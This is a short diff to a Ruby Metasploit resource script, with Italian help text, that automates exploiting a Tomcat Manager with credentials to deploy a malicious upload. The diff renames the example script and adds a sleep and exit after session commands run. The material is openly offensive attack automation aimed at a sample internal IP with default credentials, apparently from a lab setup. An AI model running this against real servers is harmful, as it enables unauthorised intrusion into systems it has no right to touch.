@@ -35,7 +35,7 @@ def help_me
             password      -  password da utilizzare per sfruttare la Tomcat Manager Application per fare l'upload malevolo
 
     Esempio:
-            msfconsole -r tomcat_mgr_deploy.rc 8080 172.20.0.6 tomcat password
+            msfconsole -r tomcat_deploy_attack.rc 8080 172.20.0.6 tomcat password
 
     |
 
@@ -87,6 +87,9 @@ def execute_attack(targetPORT, targetIP, username, password)
         run_single("set SESSION #{sessionID}")
         run_single("run")
     end
+
+    sleep(5)
+    run_single("exit -y")
 
 end
 
